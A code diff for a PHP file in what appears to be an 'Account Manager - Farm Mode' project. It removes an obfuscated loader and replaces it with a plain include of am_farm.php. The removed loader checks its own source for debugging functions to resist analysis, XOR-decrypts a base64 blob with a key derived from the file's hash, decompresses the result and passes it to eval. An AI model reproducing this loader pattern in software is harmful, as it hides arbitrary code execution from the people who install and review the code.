@@ -1,24 +1,9 @@
 <?php
-$yphuigvtsc="fe4cf981286c03c25909efe3f9e97344";
-$eldcof="5e555552540d08050201040755050003530f010b04535755005c565c54065005";
-$kqbemm="QOpc/3M+swQgPOIZRUH7dEcQXP/faIvORrEoYSG9NzxQpCVqSM92X4uh/5ua9ysQTjcwt9TW0AHO6ARIZQ0nWPowlOnS4mfqxnKxdYM43GR3lbqBKBMB5RjBuybXNLWeeGIjuKYLh4VFOtSr+zg84d62R9y+oYob/3dcY6+T5Jw2CJT3UPKU/mRKZjggR6r0J4QighVvpbObwwaC8zb3yhvJtXzefvkz9jR2fw==";
-$lgljuhum=file_get_contents(__FILE__);
-$kyikygqnl=str_replace($kqbemm,"",$lgljuhum);
-if(strpos($kyikygqnl,"ec"."ho")!==false||strpos($kyikygqnl,"pr"."int")!==false||strpos($kyikygqnl,"var_"."dump")!==false||strpos($kyikygqnl,"file_put_"."contents")!==false||strpos($kyikygqnl,"fw"."rite")!==false){die();}
-$rvwkxpof=str_replace(array($yphuigvtsc,$eldcof),array("SP_5995888d","KP_adf7e60f"),$lgljuhum);
-$ycsovyn=md5($rvwkxpof);
-$ixguprsj=hex2bin($eldcof);
-$cbyjrzxl="";
-$jxbovsh=strlen($ycsovyn);
-for($btizggwf=0;$btizggwf<$jxbovsh;$btizggwf++){
-$cbyjrzxl.=chr(ord($ixguprsj[$btizggwf])^ord($ycsovyn[$btizggwf]));
-}
-$xvsuwcgz=base64_decode($kqbemm);
-$jsjfxcse=strlen($xvsuwcgz);
-$rmnvqvcwhs="";
-$rykrqelabnz=strlen($cbyjrzxl);
-for($btizggwf=0;$btizggwf<$jsjfxcse;$btizggwf++){
-$rmnvqvcwhs.=$xvsuwcgz[$btizggwf]^$cbyjrzxl[$btizggwf%$rykrqelabnz];
-}
-$adsbmahb="gzun"."compress";
-eval($adsbmahb($rmnvqvcwhs));
+/**
+ * Account Manager - Farm Mode
+ * Includes the Farm Assistant (am_farm) screen
+ */
+
+// Include the farm assistant view directly
+include __DIR__ . '/am_farm.php';
+?>
